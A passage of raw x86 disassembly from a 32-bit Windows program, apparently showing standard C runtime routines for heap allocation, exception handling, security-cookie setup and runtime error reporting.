  426e9b:	mov    eax,ds:0x4674c8
  426ea0:	mov    ebx,eax
  426ea2:	mov    DWORD PTR [ebp-0xc],esi
  426ea5:	cmp    ebx,edi
  426ea7:	jmp    0x426ebd
  426ea9:	mov    ecx,DWORD PTR [ebx+0x4]
  426eac:	mov    edi,DWORD PTR [ebx]
  426eae:	and    ecx,DWORD PTR [ebp-0x8]
  426eb1:	and    edi,esi
  426eb3:	or     ecx,edi
  426eb5:	jne    0x426ec2
  426eb7:	add    ebx,0x14
  426eba:	cmp    ebx,DWORD PTR [ebp-0x4]
  426ebd:	mov    DWORD PTR [ebp+0x8],ebx
  426ec0:	jb     0x426ea9
  426ec2:	cmp    ebx,DWORD PTR [ebp-0x4]
  426ec5:	jne    0x426eeb
  426ec7:	mov    ebx,edx
  426ec9:	jmp    0x426edc
  426ecb:	mov    ecx,DWORD PTR [ebx+0x4]
  426ece:	mov    edi,DWORD PTR [ebx]
  426ed0:	and    ecx,DWORD PTR [ebp-0x8]
  426ed3:	and    edi,esi
  426ed5:	or     ecx,edi
  426ed7:	jne    0x426ee3
  426ed9:	add    ebx,0x14
  426edc:	cmp    ebx,eax
  426ede:	mov    DWORD PTR [ebp+0x8],ebx
  426ee1:	jb     0x426ecb
  426ee3:	cmp    ebx,eax
  426ee5:	je     0x426f7f
  426eeb:	mov    DWORD PTR ds:0x4674c8,ebx
  426ef1:	mov    eax,DWORD PTR [ebx+0x10]
  426ef4:	mov    edx,DWORD PTR [eax]
  426ef6:	cmp    edx,0xffffffff
  426ef9:	mov    DWORD PTR [ebp-0x4],edx
  426efc:	je     0x426f12
  426efe:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426f05:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426f09:	and    ecx,DWORD PTR [ebp-0x8]
  426f0c:	and    edi,esi
  426f0e:	or     ecx,edi
  426f10:	jne    0x426f48
  426f12:	mov    edx,DWORD PTR [eax+0xc4]
  426f18:	and    edx,DWORD PTR [ebp-0x8]
  426f1b:	and    DWORD PTR [ebp-0x4],0x0
  426f1f:	lea    ecx,[eax+0x44]
  426f22:	mov    esi,DWORD PTR [ecx]
  426f24:	and    esi,DWORD PTR [ebp-0xc]
  426f27:	or     edx,esi
  426f29:	mov    esi,DWORD PTR [ebp-0xc]
  426f2c:	jne    0x426f45
  426f2e:	mov    edx,DWORD PTR [ecx+0x84]
  426f34:	and    edx,DWORD PTR [ebp-0x8]
  426f37:	inc    DWORD PTR [ebp-0x4]
  426f3a:	add    ecx,0x4
  426f3d:	mov    edi,DWORD PTR [ecx]
  426f3f:	and    edi,esi
  426f41:	or     edx,edi
  426f43:	je     0x426f2e
  426f45:	mov    edx,DWORD PTR [ebp-0x4]
  426f48:	mov    ecx,edx
  426f4a:	imul   ecx,ecx,0x204
  426f50:	lea    ecx,[ecx+eax*1+0x144]
  426f57:	mov    DWORD PTR [ebp-0xc],ecx
  426f5a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  426f5e:	xor    edi,edi
  426f60:	and    ecx,esi
  426f62:	jne    0x426fd1
  426f64:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426f6b:	and    ecx,DWORD PTR [ebp-0x8]
  426f6e:	push   0x20
  426f70:	pop    edi
  426f71:	jmp    0x426fd1
  426f73:	cmp    DWORD PTR [ebx+0x8],0x0
  426f77:	jne    0x426f84
  426f79:	add    ebx,0x14
  426f7c:	mov    DWORD PTR [ebp+0x8],ebx
  426f7f:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f82:	jb     0x426f73
  426f84:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f87:	jne    0x426faf
  426f89:	mov    ebx,edx
  426f8b:	jmp    0x426f96
  426f8d:	cmp    DWORD PTR [ebx+0x8],0x0
  426f91:	jne    0x426f9d
  426f93:	add    ebx,0x14
  426f96:	cmp    ebx,eax
  426f98:	mov    DWORD PTR [ebp+0x8],ebx
  426f9b:	jb     0x426f8d
  426f9d:	cmp    ebx,eax
  426f9f:	jne    0x426faf
  426fa1:	call   0x4269b5
  426fa6:	mov    ebx,eax
  426fa8:	test   ebx,ebx
  426faa:	mov    DWORD PTR [ebp+0x8],ebx
  426fad:	je     0x426fc7
  426faf:	push   ebx
  426fb0:	call   0x426a6c
  426fb5:	pop    ecx
  426fb6:	mov    ecx,DWORD PTR [ebx+0x10]
  426fb9:	mov    DWORD PTR [ecx],eax
  426fbb:	mov    eax,DWORD PTR [ebx+0x10]
  426fbe:	cmp    DWORD PTR [eax],0xffffffff
  426fc1:	jne    0x426eeb
  426fc7:	xor    eax,eax
  426fc9:	jmp    0x427148
  426fce:	shl    ecx,1
  426fd0:	inc    edi
  426fd1:	test   ecx,ecx
  426fd3:	jge    0x426fce
  426fd5:	mov    ecx,DWORD PTR [ebp-0xc]
  426fd8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  426fdc:	mov    ecx,DWORD PTR [edx]
  426fde:	sub    ecx,DWORD PTR [ebp-0x10]
  426fe1:	mov    esi,ecx
  426fe3:	sar    esi,0x4
  426fe6:	dec    esi
  426fe7:	cmp    esi,0x3f
  426fea:	mov    DWORD PTR [ebp-0x8],ecx
  426fed:	jle    0x426ff2
  426fef:	push   0x3f
  426ff1:	pop    esi
  426ff2:	cmp    esi,edi
  426ff4:	je     0x4270fb
  426ffa:	mov    ecx,DWORD PTR [edx+0x4]
  426ffd:	cmp    ecx,DWORD PTR [edx+0x8]
  427000:	jne    0x42705e
  427002:	cmp    edi,0x20
  427005:	mov    ebx,0x80000000
  42700a:	jge    0x427032
  42700c:	mov    ecx,edi
  42700e:	shr    ebx,cl
  427010:	mov    ecx,DWORD PTR [ebp-0x4]
  427013:	lea    edi,[eax+edi*1+0x4]
  427017:	not    ebx
  427019:	mov    DWORD PTR [ebp-0x14],ebx
  42701c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  427020:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  427024:	dec    BYTE PTR [edi]
  427026:	jne    0x42705b
  427028:	mov    ecx,DWORD PTR [ebp-0x14]
  42702b:	mov    ebx,DWORD PTR [ebp+0x8]
  42702e:	and    DWORD PTR [ebx],ecx
  427030:	jmp    0x42705e
  427032:	lea    ecx,[edi-0x20]
  427035:	shr    ebx,cl
  427037:	mov    ecx,DWORD PTR [ebp-0x4]
  42703a:	lea    ecx,[eax+ecx*4+0xc4]
  427041:	lea    edi,[eax+edi*1+0x4]
  427045:	not    ebx
  427047:	and    DWORD PTR [ecx],ebx
  427049:	dec    BYTE PTR [edi]
  42704b:	mov    DWORD PTR [ebp-0x14],ebx
  42704e:	jne    0x42705b
  427050:	mov    ebx,DWORD PTR [ebp+0x8]
  427053:	mov    ecx,DWORD PTR [ebp-0x14]
  427056:	and    DWORD PTR [ebx+0x4],ecx
  427059:	jmp    0x42705e
  42705b:	mov    ebx,DWORD PTR [ebp+0x8]
  42705e:	cmp    DWORD PTR [ebp-0x8],0x0
  427062:	mov    ecx,DWORD PTR [edx+0x8]
  427065:	mov    edi,DWORD PTR [edx+0x4]
  427068:	mov    DWORD PTR [ecx+0x4],edi
  42706b:	mov    ecx,DWORD PTR [edx+0x4]
  42706e:	mov    edi,DWORD PTR [edx+0x8]
  427071:	mov    DWORD PTR [ecx+0x8],edi
  427074:	je     0x427107
  42707a:	mov    ecx,DWORD PTR [ebp-0xc]
  42707d:	lea    ecx,[ecx+esi*8]
  427080:	mov    edi,DWORD PTR [ecx+0x4]
  427083:	mov    DWORD PTR [edx+0x8],ecx
  427086:	mov    DWORD PTR [edx+0x4],edi
  427089:	mov    DWORD PTR [ecx+0x4],edx
  42708c:	mov    ecx,DWORD PTR [edx+0x4]
  42708f:	mov    DWORD PTR [ecx+0x8],edx
  427092:	mov    ecx,DWORD PTR [edx+0x4]
  427095:	cmp    ecx,DWORD PTR [edx+0x8]
  427098:	jne    0x4270f8
  42709a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42709e:	mov    BYTE PTR [ebp+0xb],cl
  4270a1:	inc    cl
  4270a3:	cmp    esi,0x20
  4270a6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4270aa:	jge    0x4270cf
  4270ac:	cmp    BYTE PTR [ebp+0xb],0x0
  4270b0:	jne    0x4270bd
  4270b2:	mov    edi,0x80000000
  4270b7:	mov    ecx,esi
  4270b9:	shr    edi,cl
  4270bb:	or     DWORD PTR [ebx],edi
  4270bd:	mov    ecx,esi
  4270bf:	mov    edi,0x80000000
  4270c4:	shr    edi,cl
  4270c6:	mov    ecx,DWORD PTR [ebp-0x4]
  4270c9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4270cd:	jmp    0x4270f8
  4270cf:	cmp    BYTE PTR [ebp+0xb],0x0
  4270d3:	jne    0x4270e2
  4270d5:	lea    ecx,[esi-0x20]
  4270d8:	mov    edi,0x80000000
  4270dd:	shr    edi,cl
  4270df:	or     DWORD PTR [ebx+0x4],edi
  4270e2:	mov    ecx,DWORD PTR [ebp-0x4]
  4270e5:	lea    edi,[eax+ecx*4+0xc4]
  4270ec:	lea    ecx,[esi-0x20]
  4270ef:	mov    esi,0x80000000
  4270f4:	shr    esi,cl
  4270f6:	or     DWORD PTR [edi],esi
  4270f8:	mov    ecx,DWORD PTR [ebp-0x8]
  4270fb:	test   ecx,ecx
  4270fd:	je     0x42710a
  4270ff:	mov    DWORD PTR [edx],ecx
  427101:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  427105:	jmp    0x42710a
  427107:	mov    ecx,DWORD PTR [ebp-0x8]
  42710a:	mov    esi,DWORD PTR [ebp-0x10]
  42710d:	add    edx,ecx
  42710f:	lea    ecx,[esi+0x1]
  427112:	mov    DWORD PTR [edx],ecx
  427114:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  427118:	mov    esi,DWORD PTR [ebp-0xc]
  42711b:	mov    ecx,DWORD PTR [esi]
  42711d:	test   ecx,ecx
  42711f:	lea    edi,[ecx+0x1]
  427122:	mov    DWORD PTR [esi],edi
  427124:	jne    0x427140
  427126:	cmp    ebx,DWORD PTR ds:0x4674b8
  42712c:	jne    0x427140
  42712e:	mov    ecx,DWORD PTR [ebp-0x4]
  427131:	cmp    ecx,DWORD PTR ds:0x4674d0
  427137:	jne    0x427140
  427139:	and    DWORD PTR ds:0x4674b8,0x0
  427140:	mov    ecx,DWORD PTR [ebp-0x4]
  427143:	mov    DWORD PTR [eax],ecx
  427145:	lea    eax,[edx+0x4]
  427148:	pop    edi
  427149:	pop    esi
  42714a:	pop    ebx
  42714b:	leave  
  42714c:	ret    
  42714d:	int3   
  42714e:	int3   
  42714f:	int3   
  427150:	push   esi
  427151:	inc    ebx
  427152:	xor    dh,BYTE PTR [eax]
  427154:	pop    eax
  427155:	inc    ebx
  427156:	xor    BYTE PTR [eax],dh
  427158:	push   ebp
  427159:	mov    ebp,esp
  42715b:	sub    esp,0x8
  42715e:	push   ebx
  42715f:	push   esi
  427160:	push   edi
  427161:	push   ebp
  427162:	cld    
  427163:	mov    ebx,DWORD PTR [ebp+0xc]
  427166:	mov    eax,DWORD PTR [ebp+0x8]
  427169:	test   DWORD PTR [eax+0x4],0x6
  427170:	jne    0x4271f8
  427176:	mov    DWORD PTR [ebp-0x8],eax
  427179:	mov    eax,DWORD PTR [ebp+0x10]
  42717c:	mov    DWORD PTR [ebp-0x4],eax
  42717f:	lea    eax,[ebp-0x8]
  427182:	mov    DWORD PTR [ebx-0x4],eax
  427185:	mov    esi,DWORD PTR [ebx+0xc]
  427188:	mov    edi,DWORD PTR [ebx+0x8]
  42718b:	cmp    esi,0xffffffff
  42718e:	je     0x4271f1
  427190:	lea    ecx,[esi+esi*2]
  427193:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427198:	je     0x4271df
  42719a:	push   esi
  42719b:	push   ebp
  42719c:	lea    ebp,[ebx+0x10]
  42719f:	call   DWORD PTR [edi+ecx*4+0x4]
  4271a3:	pop    ebp
  4271a4:	pop    esi
  4271a5:	mov    ebx,DWORD PTR [ebp+0xc]
  4271a8:	or     eax,eax
  4271aa:	je     0x4271df
  4271ac:	js     0x4271ea
  4271ae:	mov    edi,DWORD PTR [ebx+0x8]
  4271b1:	push   ebx
  4271b2:	call   0x4280e0
  4271b7:	add    esp,0x4
  4271ba:	lea    ebp,[ebx+0x10]
  4271bd:	push   esi
  4271be:	push   ebx
  4271bf:	call   0x428122
  4271c4:	add    esp,0x8
  4271c7:	lea    ecx,[esi+esi*2]
  4271ca:	push   0x1
  4271cc:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4271d0:	call   0x4281b6
  4271d5:	mov    eax,DWORD PTR [edi+ecx*4]
  4271d8:	mov    DWORD PTR [ebx+0xc],eax
  4271db:	call   DWORD PTR [edi+ecx*4+0x8]
  4271df:	mov    edi,DWORD PTR [ebx+0x8]
  4271e2:	lea    ecx,[esi+esi*2]
  4271e5:	mov    esi,DWORD PTR [edi+ecx*4]
  4271e8:	jmp    0x42718b
  4271ea:	mov    eax,0x0
  4271ef:	jmp    0x42720d
  4271f1:	mov    eax,0x1
  4271f6:	jmp    0x42720d
  4271f8:	push   ebp
  4271f9:	lea    ebp,[ebx+0x10]
  4271fc:	push   0xffffffff
  4271fe:	push   ebx
  4271ff:	call   0x428122
  427204:	add    esp,0x8
  427207:	pop    ebp
  427208:	mov    eax,0x1
  42720d:	pop    ebp
  42720e:	pop    edi
  42720f:	pop    esi
  427210:	pop    ebx
  427211:	mov    esp,ebp
  427213:	pop    ebp
  427214:	ret    
  427215:	push   ebp
  427216:	mov    ecx,DWORD PTR [esp+0x8]
  42721a:	mov    ebp,DWORD PTR [ecx]
  42721c:	mov    eax,DWORD PTR [ecx+0x1c]
  42721f:	push   eax
  427220:	mov    eax,DWORD PTR [ecx+0x18]
  427223:	push   eax
  427224:	call   0x428122
  427229:	add    esp,0x8
  42722c:	pop    ebp
  42722d:	ret    0x4
  427230:	call   0x425145
  427235:	add    eax,0x8
  427238:	ret    
  427239:	push   0x14
  42723b:	push   0x4297c8
  427240:	call   0x425290
  427245:	mov    edi,DWORD PTR [ebp+0x8]
  427248:	xor    ebx,ebx
  42724a:	cmp    edi,ebx
  42724c:	jne    0x42725c
  42724e:	push   DWORD PTR [ebp+0xc]
  427251:	call   0x425fb2
  427256:	pop    ecx
  427257:	jmp    0x4273e0
  42725c:	mov    esi,DWORD PTR [ebp+0xc]
  42725f:	cmp    esi,ebx
  427261:	jne    0x42726f
  427263:	push   edi
  427264:	call   0x425e9a
  427269:	pop    ecx
  42726a:	jmp    0x4273de
  42726f:	cmp    DWORD PTR ds:0x467704,0x3
  427276:	jne    0x4273aa
  42727c:	mov    DWORD PTR [ebp-0x1c],ebx
  42727f:	cmp    esi,0xffffffe0
  427282:	ja     0x427379
  427288:	push   0x4
  42728a:	call   0x42544f
  42728f:	pop    ecx
  427290:	mov    DWORD PTR [ebp-0x4],ebx
  427293:	push   edi
  427294:	call   0x426672
  427299:	pop    ecx
  42729a:	mov    DWORD PTR [ebp-0x20],eax
  42729d:	cmp    eax,ebx
  42729f:	je     0x427349
  4272a5:	cmp    esi,DWORD PTR ds:0x4674c4
  4272ab:	ja     0x4272f9
  4272ad:	push   esi
  4272ae:	push   edi
  4272af:	push   eax
  4272b0:	call   0x426b72
  4272b5:	add    esp,0xc
  4272b8:	test   eax,eax
  4272ba:	je     0x4272c1
  4272bc:	mov    DWORD PTR [ebp-0x1c],edi
  4272bf:	jmp    0x4272f9
  4272c1:	push   esi
  4272c2:	call   0x426e51
  4272c7:	pop    ecx
  4272c8:	mov    DWORD PTR [ebp-0x1c],eax
  4272cb:	cmp    eax,ebx
  4272cd:	je     0x4272f9
  4272cf:	mov    eax,DWORD PTR [edi-0x4]
  4272d2:	dec    eax
  4272d3:	mov    DWORD PTR [ebp-0x24],eax
  4272d6:	cmp    eax,esi
  4272d8:	jb     0x4272dc
  4272da:	mov    eax,esi
  4272dc:	push   eax
  4272dd:	push   edi
  4272de:	push   DWORD PTR [ebp-0x1c]
  4272e1:	call   0x425fd0
  4272e6:	push   edi
  4272e7:	call   0x426672
  4272ec:	mov    DWORD PTR [ebp-0x20],eax
  4272ef:	push   edi
  4272f0:	push   eax
  4272f1:	call   0x42669d
  4272f6:	add    esp,0x18
  4272f9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4272fc:	jne    0x427349
  4272fe:	cmp    esi,ebx
  427300:	jne    0x427308
  427302:	xor    esi,esi
  427304:	inc    esi
  427305:	mov    DWORD PTR [ebp+0xc],esi
  427308:	add    esi,0xf
  42730b:	and    esi,0xfffffff0
  42730e:	mov    DWORD PTR [ebp+0xc],esi
  427311:	push   esi
  427312:	push   ebx
  427313:	push   DWORD PTR ds:0x467700
  427319:	call   DWORD PTR ds:0x4290dc
  42731f:	mov    DWORD PTR [ebp-0x1c],eax
  427322:	cmp    eax,ebx
  427324:	je     0x427349
  427326:	mov    eax,DWORD PTR [edi-0x4]
  427329:	dec    eax
  42732a:	mov    DWORD PTR [ebp-0x24],eax
  42732d:	cmp    eax,esi
  42732f:	jb     0x427333
  427331:	mov    eax,esi
  427333:	push   eax
  427334:	push   edi
  427335:	push   DWORD PTR [ebp-0x1c]
  427338:	call   0x425fd0
  42733d:	push   edi
  42733e:	push   DWORD PTR [ebp-0x20]
  427341:	call   0x42669d
  427346:	add    esp,0x14
  427349:	or     DWORD PTR [ebp-0x4],0xffffffff
  42734d:	call   0x4273a1
  427352:	cmp    DWORD PTR [ebp-0x20],ebx
  427355:	jne    0x427379
  427357:	cmp    esi,ebx
  427359:	jne    0x42735e
  42735b:	xor    esi,esi
  42735d:	inc    esi
  42735e:	add    esi,0xf
  427361:	and    esi,0xfffffff0
  427364:	mov    DWORD PTR [ebp+0xc],esi
  427367:	push   esi
  427368:	push   edi
  427369:	push   ebx
  42736a:	push   DWORD PTR ds:0x467700
  427370:	call   DWORD PTR ds:0x4290e8
  427376:	mov    DWORD PTR [ebp-0x1c],eax
  427379:	mov    eax,DWORD PTR [ebp-0x1c]
  42737c:	cmp    eax,ebx
  42737e:	jne    0x4273e0
  427380:	cmp    DWORD PTR ds:0x467388,ebx
  427386:	je     0x4273e0
  427388:	push   esi
  427389:	call   0x427b72
  42738e:	pop    ecx
  42738f:	test   eax,eax
  427391:	jne    0x42727c
  427397:	jmp    0x4273de
  427399:	xor    ebx,ebx
  42739b:	mov    esi,DWORD PTR [ebp+0xc]
  42739e:	mov    edi,DWORD PTR [ebp+0x8]
  4273a1:	push   0x4
  4273a3:	call   0x4253bb
  4273a8:	pop    ecx
  4273a9:	ret    
  4273aa:	xor    eax,eax
  4273ac:	cmp    esi,0xffffffe0
  4273af:	ja     0x4273c7
  4273b1:	cmp    esi,ebx
  4273b3:	jne    0x4273b8
  4273b5:	xor    esi,esi
  4273b7:	inc    esi
  4273b8:	push   esi
  4273b9:	push   edi
  4273ba:	push   ebx
  4273bb:	push   DWORD PTR ds:0x467700
  4273c1:	call   DWORD PTR ds:0x4290e8
  4273c7:	cmp    eax,ebx
  4273c9:	jne    0x4273e0
  4273cb:	cmp    DWORD PTR ds:0x467388,ebx
  4273d1:	je     0x4273e0
  4273d3:	push   esi
  4273d4:	call   0x427b72
  4273d9:	pop    ecx
  4273da:	test   eax,eax
  4273dc:	jne    0x4273aa
  4273de:	xor    eax,eax
  4273e0:	call   0x4252cb
  4273e5:	ret    
  4273e6:	push   0x10
  4273e8:	push   0x4297d8
  4273ed:	call   0x425290
  4273f2:	cmp    DWORD PTR ds:0x467704,0x3
  4273f9:	jne    0x427435
  4273fb:	push   0x4
  4273fd:	call   0x42544f
  427402:	pop    ecx
  427403:	and    DWORD PTR [ebp-0x4],0x0
  427407:	mov    esi,DWORD PTR [ebp+0x8]
  42740a:	push   esi
  42740b:	call   0x426672
  427410:	pop    ecx
  427411:	mov    DWORD PTR [ebp-0x1c],eax
  427414:	test   eax,eax
  427416:	je     0x427423
  427418:	mov    esi,DWORD PTR [esi-0x4]
  42741b:	sub    esi,0x9
  42741e:	mov    DWORD PTR [ebp-0x20],esi
  427421:	jmp    0x427426
  427423:	mov    esi,DWORD PTR [ebp-0x20]
  427426:	or     DWORD PTR [ebp-0x4],0xffffffff
  42742a:	call   0x427453
  42742f:	cmp    DWORD PTR [ebp-0x1c],0x0
  427433:	jne    0x427448
  427435:	push   DWORD PTR [ebp+0x8]
  427438:	push   0x0
  42743a:	push   DWORD PTR ds:0x467700
  427440:	call   DWORD PTR ds:0x4290ec
  427446:	mov    esi,eax
  427448:	mov    eax,esi
  42744a:	call   0x4252cb
  42744f:	ret    
  427450:	mov    esi,DWORD PTR [ebp-0x20]
  427453:	push   0x4
  427455:	call   0x4253bb
  42745a:	pop    ecx
  42745b:	ret    
  42745c:	push   ebp
  42745d:	mov    ebp,esp
  42745f:	sub    esp,0x10
  427462:	push   esi
  427463:	lea    eax,[ebp-0x8]
  427466:	push   eax
  427467:	call   DWORD PTR ds:0x4290fc
  42746d:	mov    esi,DWORD PTR [ebp-0x4]
  427470:	xor    esi,DWORD PTR [ebp-0x8]
  427473:	call   DWORD PTR ds:0x4290f8
  427479:	xor    esi,eax
  42747b:	call   DWORD PTR ds:0x4290b4
  427481:	xor    esi,eax
  427483:	call   DWORD PTR ds:0x4290f4
  427489:	xor    esi,eax
  42748b:	lea    eax,[ebp-0x10]
  42748e:	push   eax
  42748f:	call   DWORD PTR ds:0x4290f0
  427495:	mov    eax,DWORD PTR [ebp-0xc]
  427498:	xor    eax,DWORD PTR [ebp-0x10]
  42749b:	xor    esi,eax
  42749d:	mov    DWORD PTR ds:0x4669f0,esi
  4274a3:	jne    0x4274af
  4274a5:	mov    DWORD PTR ds:0x4669f0,0xbb40e64e
  4274af:	pop    esi
  4274b0:	leave  
  4274b1:	ret    
  4274b2:	push   0x118
  4274b7:	push   0x429988
  4274bc:	call   0x425290
  4274c1:	mov    eax,ds:0x4669f0
  4274c6:	xor    eax,DWORD PTR [ebp+0x4]
  4274c9:	mov    DWORD PTR [ebp-0x1c],eax
  4274cc:	mov    eax,ds:0x467358
  4274d1:	xor    ecx,ecx
  4274d3:	cmp    eax,ecx
  4274d5:	je     0x4274f6
  4274d7:	mov    DWORD PTR [ebp-0x4],ecx
  4274da:	push   DWORD PTR [ebp+0xc]
  4274dd:	push   DWORD PTR [ebp+0x8]
  4274e0:	call   eax
  4274e2:	pop    ecx
  4274e3:	pop    ecx
  4274e4:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274e8:	jmp    0x4275f4
  4274ed:	xor    eax,eax
  4274ef:	inc    eax
  4274f0:	ret    
  4274f1:	mov    esp,DWORD PTR [ebp-0x18]
  4274f4:	jmp    0x4274e4
  4274f6:	mov    eax,DWORD PTR [ebp+0x8]
  4274f9:	dec    eax
  4274fa:	je     0x42750f
  4274fc:	mov    edi,0x429964
  427501:	mov    DWORD PTR [ebp-0x20],0x4298b0
  427508:	mov    esi,0xd4
  42750d:	jmp    0x427520
  42750f:	mov    edi,0x429890
  427514:	mov    DWORD PTR [ebp-0x20],0x4297f0
  42751b:	mov    esi,0xb9
  427520:	mov    BYTE PTR [ebp-0x24],cl
  427523:	push   0x104
  427528:	lea    eax,[ebp-0x128]
  42752e:	push   eax
  42752f:	push   ecx
  427530:	call   DWORD PTR ds:0x429084
  427536:	test   eax,eax
  427538:	jne    0x42754d
  42753a:	push   0x4294e4
  42753f:	lea    eax,[ebp-0x128]
  427545:	push   eax
  427546:	call   0x425670
  42754b:	pop    ecx
  42754c:	pop    ecx
  42754d:	lea    ebx,[ebp-0x128]
  427553:	lea    eax,[ebp-0x128]
  427559:	push   eax
  42755a:	call   0x4258a0
  42755f:	pop    ecx
  427560:	add    eax,0xb
  427563:	cmp    eax,0x3c
  427566:	jbe    0x427591
  427568:	lea    eax,[ebp-0x128]
  42756e:	push   eax
  42756f:	call   0x4258a0
  427574:	mov    ebx,eax
  427576:	lea    eax,[ebp-0x128]
  42757c:	sub    eax,0x31
  42757f:	add    ebx,eax
  427581:	push   0x3
  427583:	push   0x4294e0
  427588:	push   ebx
  427589:	call   0x425770
  42758e:	add    esp,0x10
  427591:	push   ebx
  427592:	call   0x4258a0
  427597:	pop    ecx
  427598:	lea    eax,[eax+esi*1+0xc]
  42759c:	add    eax,0x3
  42759f:	and    eax,0xfffffffc
  4275a2:	call   0x4252e0
  4275a7:	mov    DWORD PTR [ebp-0x18],esp
  4275aa:	mov    esi,esp
  4275ac:	push   edi
  4275ad:	push   esi
  4275ae:	call   0x425670
  4275b3:	mov    edi,0x4294c0
  4275b8:	push   edi
  4275b9:	push   esi
  4275ba:	call   0x425680
  4275bf:	push   0x4297e4
  4275c4:	push   esi
  4275c5:	call   0x425680
  4275ca:	push   ebx
  4275cb:	push   esi
  4275cc:	call   0x425680
  4275d1:	push   edi
  4275d2:	push   esi
  4275d3:	call   0x425680
  4275d8:	push   DWORD PTR [ebp-0x20]
  4275db:	push   esi
  4275dc:	call   0x425680
  4275e1:	push   0x12010
  4275e6:	push   0x429498
  4275eb:	push   esi
  4275ec:	call   0x425572
  4275f1:	add    esp,0x3c
  4275f4:	push   0x3
  4275f6:	call   0x4246fe
  4275fb:	int3   
  4275fc:	push   0x38
  4275fe:	push   0x429da8
  427603:	call   0x425290
  427608:	xor    ebx,ebx
  42760a:	cmp    DWORD PTR ds:0x46737c,ebx
  427610:	jne    0x42764a
  427612:	push   ebx
  427613:	push   ebx
  427614:	xor    esi,esi
  427616:	inc    esi
  427617:	push   esi
  427618:	push   0x429da4
  42761d:	push   0x100
  427622:	push   ebx
  427623:	call   DWORD PTR ds:0x429108
  427629:	test   eax,eax
  42762b:	je     0x427635
  42762d:	mov    DWORD PTR ds:0x46737c,esi
  427633:	jmp    0x42764a
  427635:	call   DWORD PTR ds:0x429034
  42763b:	cmp    eax,0x78
  42763e:	jne    0x42764a
  427640:	mov    DWORD PTR ds:0x46737c,0x2
  42764a:	cmp    DWORD PTR [ebp+0x14],ebx
  42764d:	jle    0x42766a
  42764f:	mov    ecx,DWORD PTR [ebp+0x14]
  427652:	mov    eax,DWORD PTR [ebp+0x10]
  427655:	dec    ecx
  427656:	cmp    BYTE PTR [eax],bl
  427658:	je     0x427662
  42765a:	inc    eax
  42765b:	cmp    ecx,ebx
  42765d:	jne    0x427655
  42765f:	or     ecx,0xffffffff
  427662:	or     eax,0xffffffff
  427665:	sub    eax,ecx
  427667:	add    DWORD PTR [ebp+0x14],eax
  42766a:	mov    eax,ds:0x46737c
  42766f:	cmp    eax,0x2
  427672:	je     0x427854
  427678:	cmp    eax,ebx
  42767a:	je     0x427854
  427680:	cmp    eax,0x1
  427683:	jne    0x427887
  427689:	xor    edi,edi
  42768b:	mov    DWORD PTR [ebp-0x1c],edi
  42768e:	mov    DWORD PTR [ebp-0x20],ebx
  427691:	mov    DWORD PTR [ebp-0x24],ebx
  427694:	cmp    DWORD PTR [ebp+0x20],ebx
  427697:	jne    0x4276a1
  427699:	mov    eax,ds:0x467374
  42769e:	mov    DWORD PTR [ebp+0x20],eax
  4276a1:	push   ebx
  4276a2:	push   ebx
  4276a3:	push   DWORD PTR [ebp+0x14]
  4276a6:	push   DWORD PTR [ebp+0x10]
  4276a9:	xor    eax,eax
  4276ab:	cmp    DWORD PTR [ebp+0x24],ebx
  4276ae:	setne  al
  4276b1:	lea    eax,[eax*8+0x1]
  4276b8:	push   eax
  4276b9:	push   DWORD PTR [ebp+0x20]
  4276bc:	call   DWORD PTR ds:0x429104
  4276c2:	mov    esi,eax
  4276c4:	mov    DWORD PTR [ebp-0x28],esi
  4276c7:	cmp    esi,ebx
  4276c9:	je     0x427887
  4276cf:	mov    DWORD PTR [ebp-0x4],0x1
  4276d6:	lea    eax,[esi+esi*1]
  4276d9:	add    eax,0x3
  4276dc:	and    eax,0xfffffffc
  4276df:	call   0x4252e0
  4276e4:	mov    DWORD PTR [ebp-0x18],esp
  4276e7:	mov    eax,esp
  4276e9:	mov    DWORD PTR [ebp-0x2c],eax
  4276ec:	or     DWORD PTR [ebp-0x4],0xffffffff
  4276f0:	jmp    0x42770d
  4276f2:	xor    eax,eax
  4276f4:	inc    eax
  4276f5:	ret    
  4276f6:	mov    esp,DWORD PTR [ebp-0x18]
  4276f9:	call   0x428725
  4276fe:	xor    ebx,ebx
  427700:	mov    DWORD PTR [ebp-0x2c],ebx
  427703:	or     DWORD PTR [ebp-0x4],0xffffffff
  427707:	mov    edi,DWORD PTR [ebp-0x1c]
  42770a:	mov    esi,DWORD PTR [ebp-0x28]
  42770d:	cmp    DWORD PTR [ebp-0x2c],ebx
  427710:	jne    0x42772e
  427712:	lea    eax,[esi+esi*1]
  427715:	push   eax
  427716:	call   0x425fb2
  42771b:	pop    ecx
  42771c:	mov    DWORD PTR [ebp-0x2c],eax
  42771f:	cmp    eax,ebx
  427721:	je     0x427887
  427727:	mov    DWORD PTR [ebp-0x20],0x1
  42772e:	push   esi
  42772f:	push   DWORD PTR [ebp-0x2c]
  427732:	push   DWORD PTR [ebp+0x14]
  427735:	push   DWORD PTR [ebp+0x10]
  427738:	push   0x1
  42773a:	push   DWORD PTR [ebp+0x20]
  42773d:	call   DWORD PTR ds:0x429104
  427743:	test   eax,eax
  427745:	je     0x427831
  42774b:	push   ebx
  42774c:	push   ebx
  42774d:	push   esi
  42774e:	push   DWORD PTR [ebp-0x2c]
  427751:	push   DWORD PTR [ebp+0xc]
  427754:	push   DWORD PTR [ebp+0x8]
  427757:	call   DWORD PTR ds:0x429108
  42775d:	mov    edi,eax
  42775f:	mov    DWORD PTR [ebp-0x1c],edi
  427762:	cmp    edi,ebx
  427764:	je     0x427831
  42776a:	test   BYTE PTR [ebp+0xd],0x4
  42776e:	je     0x42779d
